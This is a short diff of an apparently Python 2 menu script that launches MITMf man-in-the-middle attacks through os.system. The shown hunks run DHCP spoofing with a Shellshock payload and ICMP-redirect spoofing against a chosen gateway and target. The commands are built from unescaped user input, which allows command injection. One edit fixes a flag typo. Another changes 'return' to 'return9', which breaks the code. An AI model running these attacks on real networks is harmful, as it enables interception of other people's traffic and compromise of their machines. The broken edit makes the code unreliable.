@@ -16,7 +16,7 @@ def WriteMainMenu():
     print"	|want to do and ill do the rest. If the   |"
     print"	|program dies just restart.           	|"
     print"	|_________________________________________|"
-    return
+    return9
     
 def WriteMenuOptions():
     print"	_________________________________________"
@@ -75,7 +75,7 @@ while True:
    	 os.system("mitmf -i "+interface+" --spoof --dhcp --shellshock")
    	 break
     elif menuOption=="5":
-   	 os.system("mitmf -i "+interface+" --spoof --imcp --gateway "+gateway+" --target "+ip)
+   	 os.system("mitmf -i "+interface+" --spoof --icmp --gateway "+gateway+" --target "+ip)
    	 break
     else:
    	 whileLoopBool=False
